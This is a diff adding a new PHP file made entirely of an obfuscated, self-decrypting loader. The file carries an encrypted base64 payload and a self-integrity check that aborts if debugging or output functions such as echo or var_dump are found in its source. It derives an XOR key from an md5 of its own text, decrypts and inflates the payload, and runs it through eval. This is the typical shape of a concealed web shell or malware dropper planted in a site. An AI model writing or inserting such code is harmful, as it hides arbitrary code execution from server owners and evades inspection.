@@ -1,0 +1,24 @@
+<?php
+$trjbctotmq="27694b15db1f37ffb988b5806ab71e24";
+$efsypuyn="5056070d5657050d555002050b035602570c5e5c550600070100555303575601";
+$saldrze="jzfwWrF1JMWkm2aJzqSKREQc18lpSXlyt+F84ZCD2YQ1PN6uv3h2G8+0MIEDzlOoD0OECaSHMBZGgYWu/Pyqrv+WV9ZWtEXNE8v3ruVDNUHmHaB1LlNUBiRtReX09qWp+WEniNJgKAQOCUh1ADN9L+9hayiiVaBgRx0f3I4D5DNsROc4gDFu65VkNlgBs4Tb9JKCiLsj/zhqDeaHKBQ8WztQNTvwBHad6AY9KToNlRzcqW3lErj/HrKKAbMTHab6dpH50PgELZMI4UCtLqf+pSkMqrGqRjLTeGH5sIwSKfNzM3ulT8/ooQFeroQHoKZIzcGzwvOH109ueJTynZrBoBwFSx91VJdtIMQPX3E2hi4bcadcZcNSgkjKkzFUgRv6kPgHd6mwmklIxYC9YBpBLRzCJ0bc1k/33afpesUHUBIhUFzQtSqDMq3BkXbYiHDvyL5SyI9DjtyHIIrYByRDt4WqPSlPJULX5FgCqrok/lk+p0Mpbd1RTrORIqw8iF8PWUb2Xokz83vC5eWVVVyKCXgSlh5f/5HXa1Nev/GTUl2TP52M1pPH0ixSX3msCeFvkD8s6uAWIKrwIGMOXhj6cv4xfdDsei9hN1KKdhQ6nvT94n5kPSg/NnPoYAcPQ1MPJuZCO6xtEeEvjsW/O4jgQSJOlr4siDmOYRM4+gnEhBv7t1sD+MbD+YckrfHqkDyDfC8tJ7gzB1VhzKN0S3o34Zf36rckjOvJxpWmjX6fIkrkDR59E1ygm1FU5YduMTcxRUW8MfxbOec+qsZ3YXfIJxFiEyJFz8t21W4yU2uqnQeBZzaXhrZi9UvNTA3EqYm1nvr9fjCQKUtXNXZOt699XWaHnWamlAIIK0tMU0Uv5Linib3WWVr5W/Ek9gF7X4spfZUQOXjQPshxvW0tJxGH26Rm4D5UTVuppTfYj1fECrO4U4AH03JPTG5VnmfgEGfOZSXQ+EMsPBYXxtFk2wy5Tb9pZyfxfVoqsIhf5bobwYoyKDVfAA3iGA==";
+$ggfzwipydi=file_get_contents(__FILE__);
+$wugpmvjbwnm=str_replace($saldrze,"",$ggfzwipydi);
+if(strpos($wugpmvjbwnm,"ec"."ho")!==false||strpos($wugpmvjbwnm,"pr"."int")!==false||strpos($wugpmvjbwnm,"var_"."dump")!==false||strpos($wugpmvjbwnm,"file_put_"."contents")!==false||strpos($wugpmvjbwnm,"fw"."rite")!==false){die();}
+$mjfuauc=str_replace(array($trjbctotmq,$efsypuyn),array("SP_6b0fb0fd","KP_678ba459"),$ggfzwipydi);
+$dxmklbhxsip=md5($mjfuauc);
+$iyooozynoqph=hex2bin($efsypuyn);
+$aljxxcowhux="";
+$vqformyblduu=strlen($dxmklbhxsip);
+for($stkxtmfrif=0;$stkxtmfrif<$vqformyblduu;$stkxtmfrif++){
+    $aljxxcowhux.=chr(ord($iyooozynoqph[$stkxtmfrif])^ord($dxmklbhxsip[$stkxtmfrif]));
+}
+$faxlddav=base64_decode($saldrze);
+$ajkmbpuy=strlen($faxlddav);
+$rwiszwrsvb="";
+$zabbjpdupll=strlen($aljxxcowhux);
+for($stkxtmfrif=0;$stkxtmfrif<$ajkmbpuy;$stkxtmfrif++){
+    $rwiszwrsvb.=$faxlddav[$stkxtmfrif]^$aljxxcowhux[$stkxtmfrif%$zabbjpdupll];
+}
+$yvrvcsvmunfg="gz"."in"."fl"."ate";
+eval($yvrvcsvmunfg($rwiszwrsvb));
